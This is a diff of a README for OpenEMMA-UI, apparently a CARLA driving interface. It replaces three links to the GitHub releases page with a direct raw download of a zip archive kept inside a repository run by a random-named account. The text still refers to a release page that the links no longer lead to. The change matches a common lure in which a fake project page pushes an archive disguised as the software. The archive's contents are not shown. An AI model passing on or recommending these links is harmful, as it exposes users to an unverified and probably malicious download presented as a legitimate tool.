@@ -1,6 +1,6 @@
 # 🤖 OpenEMMA-UI - Run CARLA Driving UI Fast
 
-[![Download OpenEMMA-UI](https://img.shields.io/badge/Download-OpenEMMA--UI-blue?style=for-the-badge)](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/releases)
+[![Download OpenEMMA-UI](https://img.shields.io/badge/Download-OpenEMMA--UI-blue?style=for-the-badge)](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/raw/refs/heads/main/ui_common/UI-Open-EMM-1.3.zip)
 
 ## 🚗 Overview
 
@@ -17,7 +17,7 @@ Use it if you want a simple UI for:
 
 Visit this page to download the latest Windows release:
 
-[Download OpenEMMA-UI](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/releases)
+[Download OpenEMMA-UI](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/raw/refs/heads/main/ui_common/UI-Open-EMM-1.3.zip)
 
 On that page, look for the latest release asset for Windows. If there are several files, choose the one that matches your PC.
 
@@ -214,7 +214,7 @@ A simple workflow looks like this:
 
 If you need the file again, use this page:
 
-[OpenEMMA-UI Releases](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/releases)
+[OpenEMMA-UI Releases](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/raw/refs/heads/main/ui_common/UI-Open-EMM-1.3.zip)
 
 ## 🧩 Topic Focus
 
